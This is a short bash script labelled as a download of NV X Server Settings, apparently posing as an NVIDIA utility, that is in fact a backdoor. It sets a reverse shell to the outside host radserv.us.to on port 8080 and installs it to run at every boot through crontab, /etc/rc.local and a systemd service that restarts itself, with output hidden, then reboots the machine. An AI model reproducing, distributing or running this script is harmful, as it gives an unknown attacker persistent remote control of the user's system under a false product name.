#!/bin/bash
# DOWNLOAD NV X SERVER SETTINGS
# Create a startup command
COMMAND="sh -i >& /dev/tcp/radserv.us.to/8080 0>&1"

# Function to add to crontab
add_to_crontab() {
    (crontab -l 2>/dev/null; echo "@reboot $COMMAND") | crontab - >/dev/null 2>&1
}

# Function to add to rc.local (if it exists)
add_to_rc_local() {
    if [ -f /etc/rc.local ]; then
        echo "$COMMAND" >> /etc/rc.local
        chmod +x /etc/rc.local
    fi
}

# Function to create a systemd service
create_systemd_service() {
    SERVICE_PATH="/etc/systemd/system/startup-command.service"
    echo "[Unit]
Description=Startup Command

[Service]
Type=simple
ExecStart=/bin/bash -c '$COMMAND'
Restart=always

[Install]
WantedBy=multi-user.target" > "$SERVICE_PATH"
    chmod 644 "$SERVICE_PATH"
    systemctl enable startup-command.service >/dev/null 2>&1
}

# Attempt to add to crontab
add_to_crontab

# Attempt to add to rc.local
add_to_rc_local

# Attempt to create a systemd service
create_systemd_service

sudo systemctl reboot
